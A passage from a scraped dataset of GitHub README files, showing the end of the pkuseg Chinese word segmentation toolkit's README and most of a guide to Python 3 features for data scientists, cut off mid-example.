Average`\u663e\u793a\u7684\u662f\u5728\u6240\u6709\u6d4b\u8bd5\u96c6\u4e0aF-score\u7684\u5e73\u5747\u3002\r\n\r\n\u66f4\u591a\u8be6\u7ec6\u6bd4\u8f83\u53ef\u53c2\u89c1[\u548c\u73b0\u6709\u5de5\u5177\u5305\u7684\u6bd4\u8f83](readme\/comparison.md)\u3002\r\n\r\n## \u4f7f\u7528\u65b9\u5f0f\r\n\r\n#### \u4ee3\u7801\u793a\u4f8b\r\n\r\n\u4ee5\u4e0b\u4ee3\u7801\u793a\u4f8b\u9002\u7528\u4e8epython\u4ea4\u4e92\u5f0f\u73af\u5883\u3002\r\n\r\n\u4ee3\u7801\u793a\u4f8b1\uff1a\u4f7f\u7528\u9ed8\u8ba4\u914d\u7f6e\u8fdb\u884c\u5206\u8bcd\uff08**\u5982\u679c\u7528\u6237\u65e0\u6cd5\u786e\u5b9a\u5206\u8bcd\u9886\u57df\uff0c\u63a8\u8350\u4f7f\u7528\u9ed8\u8ba4\u6a21\u578b\u5206\u8bcd**\uff09\r\n```python3\r\nimport pkuseg\r\n\r\nseg = pkuseg.pkuseg()           # \u4ee5\u9ed8\u8ba4\u914d\u7f6e\u52a0\u8f7d\u6a21\u578b\r\ntext = seg.cut('\u6211\u7231\u5317\u4eac\u5929\u5b89\u95e8')  # \u8fdb\u884c\u5206\u8bcd\r\nprint(text)\r\n```\r\n\r\n\u4ee3\u7801\u793a\u4f8b2\uff1a\u7ec6\u9886\u57df\u5206\u8bcd\uff08**\u5982\u679c\u7528\u6237\u660e\u786e\u5206\u8bcd\u9886\u57df\uff0c\u63a8\u8350\u4f7f\u7528\u7ec6\u9886\u57df\u6a21\u578b\u5206\u8bcd**\uff09\r\n```python3\r\nimport pkuseg\r\n\r\nseg = pkuseg.pkuseg(model_name='medicine')  # \u7a0b\u5e8f\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u6240\u5bf9\u5e94\u7684\u7ec6\u9886\u57df\u6a21\u578b\r\ntext = seg.cut('\u6211\u7231\u5317\u4eac\u5929\u5b89\u95e8')              # \u8fdb\u884c\u5206\u8bcd\r\nprint(text)\r\n```\r\n\r\n\u4ee3\u7801\u793a\u4f8b3\uff1a\u5206\u8bcd\u540c\u65f6\u8fdb\u884c\u8bcd\u6027\u6807\u6ce8\uff0c\u5404\u8bcd\u6027\u6807\u7b7e\u7684\u8be6\u7ec6\u542b\u4e49\u53ef\u53c2\u8003 [tags.txt](https:\/\/github.com\/lancopku\/pkuseg-python\/blob\/master\/tags.txt)\r\n```python3\r\nimport pkuseg\r\n\r\nseg = pkuseg.pkuseg(postag=True)  # \u5f00\u542f\u8bcd\u6027\u6807\u6ce8\u529f\u80fd\r\ntext = seg.cut('\u6211\u7231\u5317\u4eac\u5929\u5b89\u95e8')    # \u8fdb\u884c\u5206\u8bcd\u548c\u8bcd\u6027\u6807\u6ce8\r\nprint(text)\r\n```\r\n\r\n\r\n\u4ee3\u7801\u793a\u4f8b4\uff1a\u5bf9\u6587\u4ef6\u5206\u8bcd\r\n```python3\r\nimport pkuseg\r\n\r\n# \u5bf9input.txt\u7684\u6587\u4ef6\u5206\u8bcd\u8f93\u51fa\u5230output.txt\u4e2d\r\n# \u5f0020\u4e2a\u8fdb\u7a0b\r\npkuseg.test('input.txt', 'output.txt', nthread=20)     \r\n```\r\n\r\n\u5176\u4ed6\u4f7f\u7528\u793a\u4f8b\u53ef\u53c2\u89c1[\u8be6\u7ec6\u4ee3\u7801\u793a\u4f8b](readme\/interface.md)\u3002\r\n\r\n\r\n\r\n#### \u53c2\u6570\u8bf4\u660e\r\n\r\n\u6a21\u578b\u914d\u7f6e\r\n```\r\npkuseg.pkuseg(model_name = \"default\", user_dict = \"default\", postag = False)\r\n\tmodel_name\t\t\u6a21\u578b\u8def\u5f84\u3002\r\n\t\t\t        \"default\"\uff0c\u9ed8\u8ba4\u53c2\u6570\uff0c\u8868\u793a\u4f7f\u7528\u6211\u4eec\u9884\u8bad\u7ec3\u597d\u7684\u6df7\u5408\u9886\u57df\u6a21\u578b(\u4ec5\u5bf9pip\u4e0b\u8f7d\u7684\u7528\u6237)\u3002\r\n\t\t\t\t\"news\", \u4f7f\u7528\u65b0\u95fb\u9886\u57df\u6a21\u578b\u3002\r\n\t\t\t\t\"web\", \u4f7f\u7528\u7f51\u7edc\u9886\u57df\u6a21\u578b\u3002\r\n\t\t\t\t\"medicine\", \u4f7f\u7528\u533b\u836f\u9886\u57df\u6a21\u578b\u3002\r\n\t\t\t\t\"tourism\", \u4f7f\u7528\u65c5\u6e38\u9886\u57df\u6a21\u578b\u3002\r\n\t\t\t        model_path, \u4ece\u7528\u6237\u6307\u5b9a\u8def\u5f84\u52a0\u8f7d\u6a21\u578b\u3002\r\n\tuser_dict\t\t\u8bbe\u7f6e\u7528\u6237\u8bcd\u5178\u3002\r\n\t\t\t\t\"default\", \u9ed8\u8ba4\u53c2\u6570\uff0c\u4f7f\u7528\u6211\u4eec\u63d0\u4f9b\u7684\u8bcd\u5178\u3002\r\n\t\t\t\tNone, \u4e0d\u4f7f\u7528\u8bcd\u5178\u3002\r\n\t\t\t\tdict_path, \u5728\u4f7f\u7528\u9ed8\u8ba4\u8bcd\u5178\u7684\u540c\u65f6\u4f1a\u989d\u5916\u4f7f\u7528\u7528\u6237\u81ea\u5b9a\u4e49\u8bcd\u5178\uff0c\u53ef\u4ee5\u586b\u81ea\u5df1\u7684\u7528\u6237\u8bcd\u5178\u7684\u8def\u5f84\uff0c\u8bcd\u5178\u683c\u5f0f\u4e3a\u4e00\u884c\u4e00\u4e2a\u8bcd\uff08\u5982\u679c\u9009\u62e9\u8fdb\u884c\u8bcd\u6027\u6807\u6ce8\u5e76\u4e14\u5df2\u77e5\u8be5\u8bcd\u7684\u8bcd\u6027\uff0c\u5219\u5728\u8be5\u884c\u5199\u4e0b\u8bcd\u548c\u8bcd\u6027\uff0c\u4e2d\u95f4\u7528tab\u5b57\u7b26\u9694\u5f00\uff09\u3002\r\n\tpostag\t\t        \u662f\u5426\u8fdb\u884c\u8bcd\u6027\u5206\u6790\u3002\r\n\t\t\t\tFalse, \u9ed8\u8ba4\u53c2\u6570\uff0c\u53ea\u8fdb\u884c\u5206\u8bcd\uff0c\u4e0d\u8fdb\u884c\u8bcd\u6027\u6807\u6ce8\u3002\r\n\t\t\t\tTrue, \u4f1a\u5728\u5206\u8bcd\u7684\u540c\u65f6\u8fdb\u884c\u8bcd\u6027\u6807\u6ce8\u3002\r\n```\r\n\r\n\u5bf9\u6587\u4ef6\u8fdb\u884c\u5206\u8bcd\r\n```\r\npkuseg.test(readFile, outputFile, model_name = \"default\", user_dict = \"default\", postag = False, nthread = 10)\r\n\treadFile\t\t\u8f93\u5165\u6587\u4ef6\u8def\u5f84\u3002\r\n\toutputFile\t\t\u8f93\u51fa\u6587\u4ef6\u8def\u5f84\u3002\r\n\tmodel_name\t\t\u6a21\u578b\u8def\u5f84\u3002\u540cpkuseg.pkuseg\r\n\tuser_dict\t\t\u8bbe\u7f6e\u7528\u6237\u8bcd\u5178\u3002\u540cpkuseg.pkuseg\r\n\tpostag\t\t\t\u8bbe\u7f6e\u662f\u5426\u5f00\u542f\u8bcd\u6027\u5206\u6790\u529f\u80fd\u3002\u540cpkuseg.pkuseg\r\n\tnthread\t\t\t\u6d4b\u8bd5\u65f6\u5f00\u7684\u8fdb\u7a0b\u6570\u3002\r\n```\r\n\r\n\u6a21\u578b\u8bad\u7ec3\r\n```\r\npkuseg.train(trainFile, testFile, savedir, train_iter = 20, init_model = None)\r\n\ttrainFile\t\t\u8bad\u7ec3\u6587\u4ef6\u8def\u5f84\u3002\r\n\ttestFile\t\t\u6d4b\u8bd5\u6587\u4ef6\u8def\u5f84\u3002\r\n\tsavedir\t\t\t\u8bad\u7ec3\u6a21\u578b\u7684\u4fdd\u5b58\u8def\u5f84\u3002\r\n\ttrain_iter\t\t\u8bad\u7ec3\u8f6e\u6570\u3002\r\n\tinit_model\t\t\u521d\u59cb\u5316\u6a21\u578b\uff0c\u9ed8\u8ba4\u4e3aNone\u8868\u793a\u4f7f\u7528\u9ed8\u8ba4\u521d\u59cb\u5316\uff0c\u7528\u6237\u53ef\u4ee5\u586b\u81ea\u5df1\u60f3\u8981\u521d\u59cb\u5316\u7684\u6a21\u578b\u7684\u8def\u5f84\u5982init_model='.\/models\/'\u3002\r\n```\r\n\r\n\r\n\r\n#### \u591a\u8fdb\u7a0b\u5206\u8bcd\r\n\r\n\u5f53\u5c06\u4ee5\u4e0a\u4ee3\u7801\u793a\u4f8b\u7f6e\u4e8e\u6587\u4ef6\u4e2d\u8fd0\u884c\u65f6\uff0c\u5982\u6d89\u53ca\u591a\u8fdb\u7a0b\u529f\u80fd\uff0c\u8bf7\u52a1\u5fc5\u4f7f\u7528`if __name__ == '__main__'`\u4fdd\u62a4\u5168\u5c40\u8bed\u53e5\uff0c\u8be6\u89c1[\u591a\u8fdb\u7a0b\u5206\u8bcd](readme\/multiprocess.md)\u3002\r\n\r\n\r\n\r\n## \u9884\u8bad\u7ec3\u6a21\u578b\r\n\r\n\u4ecepip\u5b89\u88c5\u7684\u7528\u6237\u5728\u4f7f\u7528\u7ec6\u9886\u57df\u5206\u8bcd\u529f\u80fd\u65f6\uff0c\u53ea\u9700\u8981\u8bbe\u7f6emodel_name\u5b57\u6bb5\u4e3a\u5bf9\u5e94\u7684\u9886\u57df\u5373\u53ef\uff0c\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u5bf9\u5e94\u7684\u7ec6\u9886\u57df\u6a21\u578b\u3002\r\n\r\n\u4ecegithub\u4e0b\u8f7d\u7684\u7528\u6237\u5219\u9700\u8981\u81ea\u5df1\u4e0b\u8f7d\u5bf9\u5e94\u7684\u9884\u8bad\u7ec3\u6a21\u578b\uff0c\u5e76\u8bbe\u7f6emodel_name\u5b57\u6bb5\u4e3a\u9884\u8bad\u7ec3\u6a21\u578b\u8def\u5f84\u3002\u9884\u8bad\u7ec3\u6a21\u578b\u53ef\u4ee5\u5728[release](https:\/\/github.com\/lancopku\/pkuseg-python\/releases)\u90e8\u5206\u4e0b\u8f7d\u3002\u4ee5\u4e0b\u662f\u5bf9\u9884\u8bad\u7ec3\u6a21\u578b\u7684\u8bf4\u660e\uff1a\r\n\r\n- **news**: \u5728MSRA\uff08\u65b0\u95fb\u8bed\u6599\uff09\u4e0a\u8bad\u7ec3\u7684\u6a21\u578b\u3002\r\n\r\n- **web**: \u5728\u5fae\u535a\uff08\u7f51\u7edc\u6587\u672c\u8bed\u6599\uff09\u4e0a\u8bad\u7ec3\u7684\u6a21\u578b\u3002\r\n\r\n- **medicine**: \u5728\u533b\u836f\u9886\u57df\u4e0a\u8bad\u7ec3\u7684\u6a21\u578b\u3002\r\n\r\n- **tourism**: \u5728\u65c5\u6e38\u9886\u57df\u4e0a\u8bad\u7ec3\u7684\u6a21\u578b\u3002\r\n\r\n- **mixed**: \u6df7\u5408\u6570\u636e\u96c6\u8bad\u7ec3\u7684\u901a\u7528\u6a21\u578b\u3002\u968fpip\u5305\u9644\u5e26\u7684\u662f\u6b64\u6a21\u578b\u3002\r\n\r\n\r\n\r\n\u6b22\u8fce\u66f4\u591a\u7528\u6237\u53ef\u4ee5\u5206\u4eab\u81ea\u5df1\u8bad\u7ec3\u597d\u7684\u7ec6\u5206\u9886\u57df\u6a21\u578b\u3002\r\n\r\n\r\n\r\n## \u7248\u672c\u5386\u53f2\r\n\r\n\u8be6\u89c1[\u7248\u672c\u5386\u53f2](readme\/history.md)\u3002\r\n\r\n\r\n## \u5f00\u6e90\u534f\u8bae\r\n1. \u672c\u4ee3\u7801\u91c7\u7528MIT\u8bb8\u53ef\u8bc1\u3002\r\n2. \u6b22\u8fce\u5bf9\u8be5\u5de5\u5177\u5305\u63d0\u51fa\u4efb\u4f55\u5b9d\u8d35\u610f\u89c1\u548c\u5efa\u8bae\uff0c\u8bf7\u53d1\u90ae\u4ef6\u81f3jingjingxu@pku.edu.cn\u3002\r\n\r\n\r\n\r\n## \u8bba\u6587\u5f15\u7528\r\n\r\n\u8be5\u4ee3\u7801\u5305\u4e3b\u8981\u57fa\u4e8e\u4ee5\u4e0b\u79d1\u7814\u8bba\u6587\uff0c\u5982\u4f7f\u7528\u4e86\u672c\u5de5\u5177\uff0c\u8bf7\u5f15\u7528\u4ee5\u4e0b\u8bba\u6587\uff1a\r\n* Ruixuan Luo, Jingjing Xu, Yi Zhang, Xuancheng Ren, Xu Sun. [PKUSEG: A Toolkit for Multi-Domain Chinese Word Segmentation](https:\/\/arxiv.org\/abs\/1906.11455). Arxiv. 2019.\r\n\r\n```\r\n\r\n@article{pkuseg,\r\n  author = {Luo, Ruixuan and Xu, Jingjing and Zhang, Yi and Ren, Xuancheng and Sun, Xu},\r\n  journal = {CoRR},\r\n  title = {PKUSEG: A Toolkit for Multi-Domain Chinese Word Segmentation.},\r\n  url = {https:\/\/arxiv.org\/abs\/1906.11455},\r\n  volume = {abs\/1906.11455},\r\n  year = 2019\r\n}\r\n```\r\n\r\n## \u5176\u4ed6\u76f8\u5173\u8bba\u6587\r\n\r\n* Xu Sun, Houfeng Wang, Wenjie Li. Fast Online Training with Frequency-Adaptive Learning Rates for Chinese Word Segmentation and New Word Detection. ACL. 2012.\r\n* Jingjing Xu and Xu Sun. Dependency-based gated recursive neural network for chinese word segmentation. ACL. 2016.\r\n* Jingjing Xu and Xu Sun. Transfer learning for low-resource chinese word segmentation with a novel neural network. NLPCC. 2017.\r\n\r\n## \u5e38\u89c1\u95ee\u9898\u53ca\u89e3\u7b54\r\n\r\n\r\n1. [\u4e3a\u4ec0\u4e48\u8981\u53d1\u5e03pkuseg\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#1-\u4e3a\u4ec0\u4e48\u8981\u53d1\u5e03pkuseg)\r\n2. [pkuseg\u4f7f\u7528\u4e86\u54ea\u4e9b\u6280\u672f\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#2-pkuseg\u4f7f\u7528\u4e86\u54ea\u4e9b\u6280\u672f)\r\n3. [\u65e0\u6cd5\u4f7f\u7528\u591a\u8fdb\u7a0b\u5206\u8bcd\u548c\u8bad\u7ec3\u529f\u80fd\uff0c\u63d0\u793aRuntimeError\u548cBrokenPipeError\u3002](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#3-\u65e0\u6cd5\u4f7f\u7528\u591a\u8fdb\u7a0b\u5206\u8bcd\u548c\u8bad\u7ec3\u529f\u80fd\u63d0\u793aruntimeerror\u548cbrokenpipeerror)\r\n4. [\u662f\u5982\u4f55\u8ddf\u5176\u5b83\u5de5\u5177\u5305\u5728\u7ec6\u9886\u57df\u6570\u636e\u4e0a\u8fdb\u884c\u6bd4\u8f83\u7684\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#4-\u662f\u5982\u4f55\u8ddf\u5176\u5b83\u5de5\u5177\u5305\u5728\u7ec6\u9886\u57df\u6570\u636e\u4e0a\u8fdb\u884c\u6bd4\u8f83\u7684)\r\n5. [\u5728\u9ed1\u76d2\u6d4b\u8bd5\u96c6\u4e0a\u8fdb\u884c\u6bd4\u8f83\u7684\u8bdd\uff0c\u6548\u679c\u5982\u4f55\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#5-\u5728\u9ed1\u76d2\u6d4b\u8bd5\u96c6\u4e0a\u8fdb\u884c\u6bd4\u8f83\u7684\u8bdd\u6548\u679c\u5982\u4f55)\r\n6. [\u5982\u679c\u6211\u4e0d\u4e86\u89e3\u5f85\u5206\u8bcd\u8bed\u6599\u7684\u6240\u5c5e\u9886\u57df\u5462\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#6-\u5982\u679c\u6211\u4e0d\u4e86\u89e3\u5f85\u5206\u8bcd\u8bed\u6599\u7684\u6240\u5c5e\u9886\u57df\u5462)\r\n7. [\u5982\u4f55\u770b\u5f85\u5728\u4e00\u4e9b\u7279\u5b9a\u6837\u4f8b\u4e0a\u7684\u5206\u8bcd\u7ed3\u679c\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#7-\u5982\u4f55\u770b\u5f85\u5728\u4e00\u4e9b\u7279\u5b9a\u6837\u4f8b\u4e0a\u7684\u5206\u8bcd\u7ed3\u679c)\r\n8. [\u5173\u4e8e\u8fd0\u884c\u901f\u5ea6\u95ee\u9898\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#8-\u5173\u4e8e\u8fd0\u884c\u901f\u5ea6\u95ee\u9898)\r\n9. [\u5173\u4e8e\u591a\u8fdb\u7a0b\u901f\u5ea6\u95ee\u9898\uff1f](https:\/\/github.com\/lancopku\/pkuseg-python\/wiki\/FAQ#9-\u5173\u4e8e\u591a\u8fdb\u7a0b\u901f\u5ea6\u95ee\u9898)\r\n\r\n\r\n## \u81f4\u8c22\r\n\r\n\u611f\u8c22\u4fde\u58eb\u6c76\u6559\u6388\uff08\u5317\u4eac\u5927\u5b66\u8ba1\u7b97\u8bed\u8a00\u6240\uff09\u4e0e\u90b1\u7acb\u5764\u535a\u58eb\u63d0\u4f9b\u7684\u8bad\u7ec3\u6570\u636e\u96c6\uff01\r\n\r\n## \u4f5c\u8005\r\n\r\nRuixuan Luo \uff08\u7f57\u777f\u8f69\uff09,  Jingjing Xu\uff08\u8bb8\u6676\u6676\uff09, Xuancheng Ren\uff08\u4efb\u5ba3\u4e1e\uff09, Yi Zhang\uff08\u5f20\u827a\uff09, Bingzhen Wei\uff08\u4f4d\u51b0\u9547\uff09\uff0c Xu Sun \uff08\u5b59\u6829\uff09  \r\n\r\n\u5317\u4eac\u5927\u5b66 [\u8bed\u8a00\u8ba1\u7b97\u4e0e\u673a\u5668\u5b66\u4e60\u7814\u7a76\u7ec4](http:\/\/lanco.pku.edu.cn\/)\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"},{"repo":"\/arogozhnikov\/python3_with_pleasure","language":null,"readme_contents":"# Migrating to Python 3 with pleasure\n## A short guide on features of Python 3 for data scientists\n\nPython became a mainstream language for machine learning and other scientific fields that heavily operate with data;\nit boasts various deep learning frameworks and well-established set of tools for data processing and visualization.\n\nHowever, Python ecosystem co-exists in Python 2 and Python 3, and Python 2 is still used among data scientists.\nBy the end of 2019 the scientific stack will [stop supporting Python2](http:\/\/www.python3statement.org).\nAs for numpy, after 2018 any new feature releases will only support [Python3](https:\/\/github.com\/numpy\/numpy\/blob\/master\/doc\/neps\/dropping-python2.7-proposal.rst). *Update (Sep 2018): same story now with pandas, matplotlib, ipython, jupyter notebook and jupyter lab.*\n\nTo make the transition less frustrating, I've collected a bunch of Python 3 features that you may find useful.\n\n<img src='https:\/\/uploads.toptal.io\/blog\/image\/92216\/toptal-blog-image-1457618659472-be2f380fe3aad41333427ecd5a1ec5c5.jpg' width=400 \/>\n\nImage from [Dario Bertini post (toptal)](https:\/\/www.toptal.com\/python\/python-3-is-it-worth-the-switch)\n\n## Better paths handling with `pathlib`\n\n`pathlib` is a default module in python3, that helps you to avoid tons of `os.path.join`s:\n\n```python\nfrom pathlib import Path\n\ndataset = 'wiki_images'\ndatasets_root = Path('\/path\/to\/datasets\/')\n\ntrain_path = datasets_root \/ dataset \/ 'train'\ntest_path = datasets_root \/ dataset \/ 'test'\n\nfor image_path in train_path.iterdir():\n    with image_path.open() as f: # note, open is a method of Path object\n        # do something with an image\n```\n\nPreviously it was always tempting to use string concatenation (concise, but obviously bad),\nnow with `pathlib` the code is safe, concise, and readable.\n\nAlso `pathlib.Path` has a bunch of methods and properties, that every python novice previously had to google:\n\n```python\np.exists()\np.is_dir()\np.parts\np.with_name('sibling.png') # only change the name, but keep the folder\np.with_suffix('.jpg') # only change the extension, but keep the folder and the name\np.chmod(mode)\np.rmdir()\n```\n\n`pathlib` should save you lots of time,\nplease see [docs](https:\/\/docs.python.org\/3\/library\/pathlib.html) and [reference](https:\/\/pymotw.com\/3\/pathlib\/) for more.\n\n\n## Type hinting is now part of the language\n\nExample of type hinting in pycharm: <br\/>\n<img src='images\/pycharm-type-hinting.png' \/>\n\nPython is not just a language for small scripts anymore,\ndata pipelines these days include numerous steps each involving different frameworks (and sometimes very different logic).\n\nType hinting was introduced to help with growing complexity of programs, so machines could help with code verification.\nPreviously different modules used custom ways to point [types in docstrings](https:\/\/www.jetbrains.com\/help\/pycharm\/type-hinting-in-pycharm.html#legacy)\n(Hint: pycharm can convert old docstrings to fresh type hinting).\n\nAs a simple example, the following code may work with different types of data (that's what we like about python data stack).\n```python\ndef repeat_each_entry(data):\n    \"\"\" Each entry in the data is doubled\n    <blah blah nobody reads the documentation till the end>\n    \"\"\"\n    index = numpy.repeat(numpy.arange(len(data)), 2)\n    return data[index]\n```\n\nThis code e.g. works for `numpy.array` (incl. multidimensional ones), `astropy.Table` and `astropy.Column`, `bcolz`, `cupy`, `mxnet.ndarray` and others.\n\nThis code will work for `pandas.Series`, but in the wrong way:\n```python\nrepeat_each_entry(pandas.Series(data=[0, 1, 2], index=[3, 4, 5])) # returns Series with Nones inside\n```\n\nThis was two lines of code. Imagine how unpredictable behavior of a complex system, because just one function may misbehave.\nStating explicitly which types a method expects is very helpful in large systems, this will warn you if a function was passed unexpected arguments.\n\n```python\ndef repeat_each_entry(data: Union[numpy.ndarray, bcolz.carray]):\n```\n\nIf you have a significant codebase, hinting tools like [MyPy](http:\/\/mypy.readthedocs.io) are likely to become part of your continuous integration pipeline.\nA webinar [\"Putting Type Hints to Work\"](https:\/\/www.youtube.com\/watch?v=JqBCFfiE11g) by Daniel Pyrathon is good for a brief introduction.\n\nSidenote: unfortunately, hinting is not yet powerful enough to provide fine-grained typing for ndarrays\/tensors, but [maybe we'll have it once](https:\/\/github.com\/numpy\/numpy\/issues\/7370), and this will be a great feature for DS.\n\n## Type hinting \u2192 type checking in runtime\n\nBy default, function annotations do not influence how your code is working, but merely help you to point code intentions.\n\nHowever, you can enforce type checking in runtime with tools like ... [enforce](https:\/\/github.com\/RussBaz\/enforce),\nthis can help you in debugging (there are many cases when type hinting is not working).\n\n```python\n@enforce.runtime_validation\ndef foo(text: str) -> None:\n    print(text)\n\nfoo('Hi') # ok\nfoo(5)    # fails\n\n\n@enforce.runtime_validation\ndef any2(x: List[bool]) -> bool:\n    return any(x)\n\nany ([False, False, True, False]) # True\nany2([False, False, True, False]) # True\n\nany (['False']) # True\nany2(['False']) # fails\n\nany ([False, None, \"\", 0]) # False\nany2([False, None, \"\", 0]) # fails\n\n```\n\n## <strike>Other usages of function annotations<\/strike>\n\n*Update: starting from python 3.7 this behavior was [depreciated](https:\/\/www.python.org\/dev\/peps\/pep-0563\/#non-typing-usage-of-annotations), and function annotations should be used for type hinting only. Python 4 will not support other usages of annotations.*\n\nAs mentioned before, annotations do not influence code execution, but rather provide some meta-information,\nand you can use it as you wish.\n\nFor instance, measurement units are a common pain in scientific areas, `astropy` package [provides a simple decorator](http:\/\/docs.astropy.org\/en\/stable\/units\/quantity.html#functions-that-accept-quantities) to control units of input quantities and convert output to required units\n```python\n# Python 3\nfrom astropy import units as u\n@u.quantity_input()\ndef frequency(speed: u.meter \/ u.s, wavelength: u.nm) -> u.terahertz:\n    return speed \/ wavelength\n\nfrequency(speed=300_000 * u.km \/ u.s, wavelength=555 * u.nm)\n# output: 540.5405405405404 THz, frequency of green visible light\n```\n\nIf you're processing tabular scientific data in python (not necessarily astronomical), you should give `astropy` a shot.\n\nYou can also define your application-specific decorators to perform control \/ conversion of inputs and output in the same manner.\n\n## Matrix multiplication with @\n\nLet's implement one of the simplest ML models &mdash; a linear regression with l2 regularization (a.k.a. ridge regression):\n\n```python\n# l2-regularized linear regression: || AX - y ||^2 + alpha * ||x||^2 -> min\n\n# Python 2\nX = np.linalg.inv(np.dot(A.T, A) + alpha * np.eye(A.shape[1])).dot(A.T.dot(y))\n# Python 3\nX = np.linalg.inv(A.T @ A + alpha * np.eye(A.shape[1])) @ (A.T @ y)\n```\n\nThe code with `@` becomes more readable and more translatable between deep learning frameworks: same code `X @ W + b[None, :]` for a single layer of perceptron works in `numpy`, `cupy`, `pytorch`, `tensorflow` (and other frameworks that operate with tensors).\n\n## Globbing with `**`\n\nRecursive folder globbing is not easy in Python 2, even though the [glob2](https:\/\/github.com\/miracle2k\/python-glob2) custom module exists that overcomes this. A recursive flag is supported since Python 3.5:\n\n```python\nimport glob\n\n# Python 2\nfound_images = (\n    glob.glob('\/path\/*.jpg')\n  + glob.glob('\/path\/*\/*.jpg')\n  + glob.glob('\/path\/*\/*\/*.jpg')\n  + glob.glob('\/path\/*\/*\/*\/*.jpg')\n  + glob.glob('\/path\/*\/*\/*\/*\/*.jpg'))\n\n# Python 3\nfound_images = glob.glob('\/path\/**\/*.jpg', recursive=True)\n```\n\nA better option is to use `pathlib` in python3 (minus one import!):\n```python\n# Python 3\nfound_images = pathlib.Path('\/path\/').glob('**\/*.jpg')\n```\nNote: there are [minor differences](https:\/\/github.com\/arogozhnikov\/python3_with_pleasure\/issues\/16) between `glob.glob`, `Path.glob` and bash globbing.\n\n## Print is a function now\n\nYes, code now has these annoying parentheses, but there are some advantages:\n\n- simple syntax for using file descriptor:\n    ```python\n    print >>sys.stderr, \"critical error\"      # Python 2\n    print(\"critical error\", file=sys.stderr)  # Python 3\n    ```\n- printing tab-aligned tables without `str.join`:\n    ```python\n    # Python 3\n    print(*array, sep='\\t')\n    print(batch, epoch, loss, accuracy, time, sep='\\t')\n    ```\n- hacky suppressing \/ redirection of printing output:\n    ```python\n    # Python 3\n    _print = print # store the original print function\n    def print(*args, **kargs):\n        pass  # do something useful, e.g. store output to some file\n    ```\n    In jupyter it is desirable to log each output to a separate file (to track what's happening after you got disconnected), so you can override `print` now.\n\n    Below you can see a context manager that temporarily overrides behavior of print:\n    ```python\n    @contextlib.contextmanager\n    def replace_print():\n        import builtins\n        _print = print # saving old print function\n        # or use some other function here\n        builtins.print = lambda *args, **kwargs: _print('new printing', *args, **kwargs)\n        yield\n        builtins.print = _print\n\n    with replace_print():\n        <code here will invoke other print function>\n    ```\n    It is *not* a recommended approach, but a small dirty hack that is now possible.\n- `print` can participate in list comprehensions and other language constructs\n    ```python\n    # Python 3\n    result = process(x) if is_valid(x) else print('invalid item: ', x)\n    ```\n\n\n## Underscores in Numeric Literal (Thousands Separator)\n\n[PEP-515](https:\/\/www.python.org\/dev\/peps\/pep-0515\/ \"PEP-515\") introduced underscores in Numeric Literals.\nIn Python3, underscores can be used to group digits visually in integral, floating-point, and complex number literals.\n\n```python\n# grouping decimal numbers by thousands\none_million = 1_000_000\n\n# grouping hexadecimal addresses by words\naddr = 0xCAFE_F00D\n\n# grouping bits into nibbles in a binary literal\nflags = 0b_0011_1111_0100_1110\n\n# same, for string conversions\nflags = int('0b_1111_0000', 2)\n```\n\n## f-strings for simple and reliable formatting\n\nThe default formatting system provides a flexibility that is not required in data experiments.\nThe resulting code is either too verbose or too fragile towards any changes.\n\nQuite typically data scientists outputs some logging information iteratively in a fixed format.\nIt is common to have a code like:\n\n```python\n# Python 2\nprint '{batch:3} {epoch:3} \/ {total_epochs:3}  accuracy: {acc_mean:0.4f}\u00b1{acc_std:0.4f} time: {avg_time:3.2f}'.format(\n    batch=batch, epoch=epoch, total_epochs=total_epochs,\n    acc_mean=numpy.mean(accuracies), acc_std=numpy.std(accuracies),\n    avg_time=time \/ len(data_batch)\n)\n\n# Python 2 (too error-prone during fast modifications, please avoid):\nprint '{:3} {:3} \/ {:3}  accuracy: {:0.4f}\u00b1{:0.4f} time: {:3.2f}'.format(\n    batch, epoch, total_epochs, numpy.mean(accuracies), numpy.std(accuracies),\n    time \/ len(data_batch)\n)\n```\n\nSample output:\n```\n120  12 \/ 300  accuracy: 0.8180\u00b10.4649 time: 56.60\n```\n\n**f-strings** aka formatted string literals were introduced in Python 3.6:\n```python\n# Python 3.6+\nprint(f'{batch:3} {epoch:3} \/ {total_epochs:3}  accuracy: {numpy.mean(accuracies):0.4f}\u00b1{numpy.std(accuracies):0.4f} time: {time \/ len(data_batch):3.2f}')\n```\n\n\n## Explicit difference between 'true division' and 'floor division'\n\nFor data science this is definitely a handy change \n\n```python\ndata = pandas.read_csv('timing.csv')\nvelocity = data['distance'] \/ data['time']\n```\n\nResults in Python 2 depend on whether 'time' and 'distance' (e.g. measured in meters and seconds) are stored as integers.\nIn Python 3, the result is correct in both cases, because the result of division is float.\n\nAnother case is floor division, which is now an explicit operation:\n\n```python\nn_gifts = money \/\/ gift_price  # correct for int and float arguments\n```\n\nIn a nutshell:\n\n```python\n>>> from operator import truediv, floordiv\n>>> truediv.__doc__, floordiv.__doc__\n('truediv(a, b) -- Same as a \/ b.', 'floordiv(a, b) -- Same as a \/\/ b.')\n>>> (3 \/ 2), (3 \/\/ 2), (3.0 \/\/ 2.0)\n(1.5, 1, 1.0)\n```\n\nNote, that this applies both to built-in types and to custom types provided by data packages (e.g. `numpy` or `pandas`).\n\n\n## Strict ordering\n\n```python\n# All these comparisons are illegal in Python 3\n3 < '3'\n2 < None\n(3, 4) < (3, None)\n(4, 5) < [4, 5]\n\n# False in both Python 2 and Python 3\n(4, 5) == [4, 5]\n```\n\n- prevents from occasional sorting of instances of different types\n  ```python\n  sorted([2, '1', 3])  # invalid for Python 3, in Python 2 returns [2, 3, '1']\n  ```\n- helps to spot some problems that arise when processing raw data\n\nSidenote: proper check for None is (in both Python versions)\n```python\nif a is not None:\n  pass\n\nif a: # WRONG check for None\n  pass\n```\n\n\n## Unicode for NLP\n\n```python\ns = 